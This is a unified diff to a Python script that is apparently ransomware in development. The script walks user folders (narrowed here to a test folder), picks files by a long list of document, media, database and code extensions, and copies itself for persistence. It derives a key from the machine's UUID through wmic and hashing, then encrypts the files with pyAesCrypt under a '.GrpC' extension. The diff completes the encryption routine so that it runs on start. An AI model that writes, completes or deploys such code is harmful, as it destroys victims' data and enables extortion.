@@ -7,12 +7,13 @@ from pyAesCrypt import encryptFile, decryptFile
 
 project_name = sys.argv[0]
 filext = ".GrpC"
-filelimit = 1024 * 1024 # 1 GB
+filelimit = 1024 * 1024 * 1024 # 1 GB
 
 def find_files(mode="E"):
     allFiles = []
-    valid_extensions = ["exe", "doc", "docx", "html", "htm", "odt", "pdf", "xls", "xlsx", "ods", "ppt", "pptx", "txt", "jpeg", "jpg", "png", "gif", "tiff", "psd", "eps", "ai", "indd", "raw", "bmp", "webp", "bat", "svg", "mp4", "avi", "mov", "flv", "wmv", "mpg", "pcm", "wav", "aiff", "mp3", "ogg", "aac", "wma", "flac", "alac", "wma", "zip", "rar", "csv", "torrent", "sqlite3", "sqlite", "db", "sql", "accdb", "sln", "suo", "cpp", "c", "cmd", "php", "java", "jar", "mpeg", "mov", "3gp", "mkv", "psd", "bak", "key", "7z", "iso", "bin", "dat", "log", "dbf", "tar", "xml", "py", "rb", "js", "md", "class", "cs", "h", "dll", "mkv" , "mid"]
-    allowed_dirs = ["Desktop", "Documents", "Downloads", "Music", "Videos", "Pictures"]
+    valid_extensions = ["doc", "docx", "html", "htm", "odt", "pdf", "xls", "xlsx", "ods", "ppt", "pptx", "txt", "jpeg", "jpg", "png", "gif", "tiff", "psd", "eps", "ai", "indd", "raw", "bmp", "webp", "bat", "svg", "mp4", "avi", "mov", "flv", "wmv", "mpg", "pcm", "wav", "aiff", "mp3", "ogg", "aac", "wma", "flac", "alac", "wma", "rar", "csv", "torrent", "sqlite3", "sqlite", "db", "sql", "accdb", "sln", "suo", "cpp", "c", "cmd", "php", "java", "jar", "mpeg", "mov", "3gp", "mkv", "psd", "bak", "key", "7z", "iso", "bin", "dat", "log", "dbf", "tar", "xml", "py", "rb", "js", "md", "class", "cs", "h", "dll", "mkv" , "mid", "exe"]
+    #allowed_dirs = ["Desktop", "Documents", "Downloads", "Music", "Videos", "Pictures"]
+    allowed_dirs = ["LGX"]
     username = os.path.expanduser("~")
     for dirs in allowed_dirs:
         for root, subfiles, files in os.walk(os.path.join(username, dirs)):
@@ -44,7 +45,7 @@ def decryptFiles(files, password):
             pass
 
 def filter_file_size(files):
-    files = list(filter(lambda x: x.st_size <= filelimit, files))
+    files = list(filter(lambda x: os.stat(x).st_size <= filelimit, files))
     return files
 
 def persistence():
@@ -54,15 +55,19 @@ def persistence():
     if not os.path.exists(os.path.join(path, project_name)):
         copy2(current_path, path)
 
-
 def genpass():
      password = str(subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip())
      password = sha512(password.encode()).hexdigest()
      password = sha256(password.encode()).hexdigest()
      return password
 
-def start():
+def start(mode="E"):
     persistence()
+    files_t = find_files(mode)
+    files_t = filter_file_size(files_t)
+    password = genpass()
+    encryptFiles(files_t, password)
+
 
 if __name__ == "__main__":
     start()
